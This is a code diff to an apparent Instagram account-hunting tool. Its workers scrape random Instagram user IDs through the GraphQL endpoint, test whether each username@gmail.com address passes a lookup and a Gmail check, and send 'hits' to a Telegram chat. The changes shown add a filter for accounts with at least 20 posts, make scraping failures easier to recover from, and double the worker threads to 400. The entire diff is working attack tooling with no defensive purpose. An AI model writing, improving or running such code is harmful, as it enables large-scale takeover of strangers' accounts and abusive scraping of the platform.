@@ -1591,6 +1591,9 @@ def _m2_save_hit(username, user_data, token, chat_id):
     """Format M2 hit, write to file, notify Telegram."""
     global _m2_hits, _m2_total
     try:
+        posts = int(user_data.get('media_count') or 0)
+        if posts < 20:
+            return
         email       = f"{username}@gmail.com"
         gmail_masked = _m2_get_masked(username)
 
@@ -1620,10 +1623,11 @@ def _m2_save_hit(username, user_data, token, chat_id):
 
 # ── Scanner worker ─────────────────────────────────────────────────────────────
 
-def _m2_get_usernames(token, chat_id, min_followers, stop_event):
-    """Single worker: scrape random IG user IDs, run lookup → Gmail check → hit."""
+def _m2_get_usernames(token, chat_id, min_posts, stop_event):
+    """Single worker: scrape random IG user IDs, filter by posts, run lookup → Gmail check → hit."""
     global _m2_scanned
     loc_session = _register_session(requests.Session())
+    _min_posts = max(20, int(min_posts) if min_posts else 20)
     while not (stop_event and stop_event.is_set()):
         try:
             csrf, lsd = _m2_load_tokens()
@@ -1652,14 +1656,17 @@ def _m2_get_usernames(token, chat_id, min_followers, stop_event):
             }
             resp = loc_session.post(
                 'https://www.instagram.com/api/graphql',
-                headers=headers, data=payload, cookies=cookies, timeout=15
+                headers=headers, data=payload, cookies=cookies, timeout=10
             )
             _m2_scanned += 1
-            ud       = resp.json().get('data', {}).get('user', {})
+            try:
+                ud = resp.json().get('data', {}).get('user') or {}
+            except Exception:
+                continue
             username = ud.get('username')
-            followers = ud.get('follower_count', 0)
+            posts    = int(ud.get('media_count') or 0)
             uid      = ud.get('pk')
-            if username and uid and followers and followers > (min_followers if min_followers > 0 else 20):
+            if username and uid and posts >= _min_posts:
                 email = username + '@gmail.com'
                 if _m2_lookup(email, loc_session):
                     if _m2_check_gmail(username, loc_session):
@@ -1689,7 +1696,7 @@ def run_method2_web(token, chat_id, min_followers, stop_event):
     Thread(target=_m2_get_tl,     daemon=True).start()
     Thread(target=_m2_get_tokens, daemon=True).start()
 
-    NUM_WORKERS = 200
+    NUM_WORKERS = 400
     try:
         while not stop_event.is_set():
             with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
